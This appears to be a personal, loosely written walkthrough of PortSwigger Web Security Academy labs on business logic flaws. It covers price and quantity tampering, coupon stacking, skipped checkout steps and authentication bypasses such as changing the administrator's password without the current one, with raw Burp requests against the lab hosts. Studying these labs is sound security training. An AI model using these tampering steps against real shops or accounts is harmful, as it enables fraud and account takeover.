## Business logic vulnerabilities

Business logic vulnerabilities need manual intervention as No tool can detect these and they can vary from application to application and very hazardous. 
We have to understand application logic, application functionality, implementations, and business requirements. Whenever we intercept the request,
we have to manipulate specific parameters in the request or so to test for the business logic vulnerability


 ## Some common example of business logic:
 
 Manipulation in the product price in the request so we can purchase products in less amount during the online shopping.
 
 Manipulation in user-supplied input (too much quantity or –ve quantity) and not checked from the server-side.
 
 Manipulation in intended flow (2FA).
 
 ## 1. Manipulation in the product price in the request so we can purchase products in less amount during the online shopping.
 
 With Burp running, log in and attempt to buy the leather jacket. The order is rejected because you don't have enough store credit. 
 
 In Burp, go to "Proxy" > "HTTP history" and study the order process. Notice that when you add an item to your cart,
 the corresponding request contains a price parameter. Send the POST /cart request to Burp Repeater. 
 
 ## Request 
 
    POST /cart HTTP/1.1
    Host: 0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
    Cookie: session=VQHFrZjrndyN8kEb1ivgOD4X9YydBrGB
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    Origin: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net
    Referer: https://0a5d00c0038b8062c09a11d7009700cc.web-security-academy.net/product?productId=1
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    productId=1&redir=PRODUCT&quantity=1&price=133700
    
 ## Note That Show Price in request 
 
     productId=1&redir=PRODUCT&quantity=1&price=133700   
     
 So Change The Price and sand the request in server, like server is accept the request, here business logic vulnerabilities
 
 
 ## 2. High-level logic vulnerability
 
 Your card amount 100$ but you wante purchase 200$ product, buy 2 product first product price 50$ and secand product price 150$
 
 First Product nurp request sand burp repeter and  Observe that product quantity=1 so chnage the product guantity add -
 
 just like quantity=-2 and sand the request in server, accept the request, this is vulnerability 
 
 ## Request 
 
    POST /cart HTTP/1.1
    Host: 0ab6005b04eb8061c0d3246e00430049.web-security-academy.net
    Cookie: session=BC6C85CuO7OKzvT5oSjqsThv5qBb6Xap
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 37
    Origin: https://0ab6005b04eb8061c0d3246e00430049.web-security-academy.net
    Referer: https://0ab6005b04eb8061c0d3246e00430049.web-security-academy.net/product?productId=2
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    productId=2&redir=PRODUCT&quantity=1
 
 Change The product header like quantity=1 so change quantity=-2
 
    productId=2&redir=PRODUCT&quantity=-2
    
 Your product price 100$ so buy know the product price 200$ but this is vulnerable so your product price 100$
     
     
 ## 3. Low-level logic flaw
 
 First Add 2 product, first product price is 100$, secand product price is 200$, Total price is 300$, 
 
 some appliction limited add product, so add unlimited product the price is less the price {-} so this is vulnerblity
 
 how to find, simple, On the "Payloads" tab, select the payload type "Null payloads". Under "Payload options", select "Continue indefinitely". Start the attack 
 
 While the attack is running, go to your cart. Keep refreshing the page every so often and monitor the total price. Eventually, notice that the price suddenly switches to a large negative integer
 
 ## This is Vulnerblity
 
 Create the same Intruder attack again, but this time, under "Payloads" > "Payload Options", choose to generate exactly 323 payloads. 
 
 Notice That the price is negative like -100 so add some product and price is positive 100 so buy the product, This is Low-level logic flaw vulnerblity
  
 
 ## 4. Inconsistent security controls
 
 I found a Loging page but this loging page only for allow admin user like asif@admin.com email user, but i have gmail user like asif@gmail.com so 
 
 First reqester account is local user like asif@gmail.com secand update email fuction i am use a asif@admin.com so this email is update 
 
 ## This is Vulnerblity
 
 
 ## 5. Weak isolation on dual-use endpoint
 
 With Burp running, log in and access your account page.
 
 Change your password. 
 
 Study the POST /my-account/change-password request in Burp Repeater.
 
 Notice that if you remove the current-password parameter entirely, you are able to successfully change your password without providing your current one. 
 
 Observe that the user whose password is changed is determined by the username parameter. Set username=administrator and send the request again. 
 
## The Request is Accepted This is Vulnerblity
 
 
    POST /my-account/change-password HTTP/1.1
    Host: 0af200a303444b49c0479118006f0066.web-security-academy.net
    Cookie: session=cLpA7MwciG5r6gQg0qijALMT0lUaf6FK
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 131
    Origin: https://0af200a303444b49c0479118006f0066.web-security-academy.net
    Referer: https://0af200a303444b49c0479118006f0066.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    csrf=yMlABSWkf5sH22vGwGQQLiWMKK4lhUYl&username=administrator&current-password=hi&new-password-1=khan&new-password-2=khan
 
 
 Note That Last Header like current-password=hi so remove the current-password parameter and sand the request is server, the server accept the
 
 request This is Vulnerabley
 
 
 
 ## 6. Password reset broken logic
 
 Created Two Account first account asif and secand account khan
 
 With Burp running, click the Forgot your password? link and enter your own username. sand the forgot password link in email
 
 Check The Email and Click the link in the email and reset your password to whatever you want. 
 
 In Burp Repeater, observe that the password reset functionality still works even if you delete the token of the temp-forgot-password-token parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password. 
 
 
    POST /forgot-password?temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu HTTP/1.1
    Host: 0a7700010413bae5c061c30700a60020.web-security-academy.net
    Cookie: session=r4IcnPAgxzJSVzZN4nq3v5CyaQO39587
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 115
    Origin: https://0a7700010413bae5c061c30700a60020.web-security-academy.net
    Referer: https://0a7700010413bae5c061c30700a60020.web-security-academy.net/forgot-password?temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu&username=asif&new-password-1=khan&new-password-2=khan
 
 Remove headr temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu and body temp-forgot-password-token=CInzFUtiTwEkLmeJGibDaqkD8pmISCgu remove
 
 and sand the request an request accepted 
 
 ## This is Vulnerblity
 
 Chnage The username like username asif to change and add khan like forget password khan account
 
  ## 7. Insufficient workflow validation
  
  You Have 100$ your card okk first you add a 30$ product in card secand checkout the product, the checkout request burp intercept and sand repeter like 
  
  
    GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
    Host: 0a0600f60495fb95c0d611c500d6005b.web-security-academy.net
    Cookie: session=WXuC7ZOLgiqvNFVoVX5ZTkSkx0UHinhs
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a0600f60495fb95c0d611c500d6005b.web-security-academy.net/cart
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
    
Then add a new product like 300$ you have 30$ product checkout request in repeter, sand the repeter request to server and server is accepted an 300$ product is buy 

## This is Vulnerblity

## 8. Authentication bypass via flawed state machine

You login in you account your role is local user not privelage but here funtion like you loging in account like check the which level user

so check level user request drop the request so defaulted to privelage account 


    GET /role-selector HTTP/1.1
    Host: 0a7d00e203fc9032c1e412fd008400bd.web-security-academy.net
    Cookie: session=y67BXo6YyLaVNFx3uSwbklG3RtqGNXkC
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a7d00e203fc9032c1e412fd008400bd.web-security-academy.net/login
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

Check GET header GET/role-selector so This request Drop 


 ## 9. Flawed enforcement of business rules
 
Created Two Account First asif@gmail.com secand khan@gmail.com This website is buy a product and use coupon code some discount 

asif@gmail.com account coupon code like NEWCUST5. khan@gmail.com coupon code like SIGNUP30. 

Then i am loging asif@gmail.com account and use NEWCUST5 coupon code and some discount and use again use the coupon code they fail and see the message "Coupon already applied"

Then I am useing First use NEWCUST5 coupn code and secand use SIGNUP30 this coupn code and again use NEWCUST5 and again use SIGNUP30 coupn code and Ammount is 00 

## This is Vulnerblity
